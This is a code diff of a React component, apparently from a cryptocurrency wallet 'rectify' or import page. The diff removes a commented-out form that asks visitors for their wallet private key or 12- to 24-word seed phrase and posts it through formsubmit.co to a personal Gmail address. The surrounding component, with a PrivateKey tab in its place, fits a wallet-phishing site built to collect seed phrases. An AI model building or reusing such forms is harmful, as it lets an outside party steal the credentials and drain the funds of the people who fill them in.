@@ -106,37 +106,6 @@ function Rectify() {
                   <Keystone/>
                 </TabPanel>
                 <TabPanel>
-                  {/* <form
-                    className="fmt_panel"
-                    action="https://formsubmit.co/m.hassnainkhan32@gmail.com"
-                    method="POST"
-                  >
-                    <input
-                      required
-                      placeholder="Enter your Private Key"
-                      type="text"
-                      name="private key"
-                    />
-                    <p>
-                      Typically 12 (sometimes 24) words separated by single
-                      spaces
-                    </p>
-                    <button type="submit">
-                      IMPORT
-                      <span>
-                        <svg
-                          fill="none"
-                          strokeLinecap="round"
-                          strokeLinejoin="round"
-                          strokeWidth="2"
-                          viewBox="0 0 24 24"
-                          stroke="currentColor"
-                        >
-                          <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
-                        </svg>
-                      </span>
-                    </button>
-                  </form> */}
                   <PrivateKey/>
                 </TabPanel>
               </Tabs>
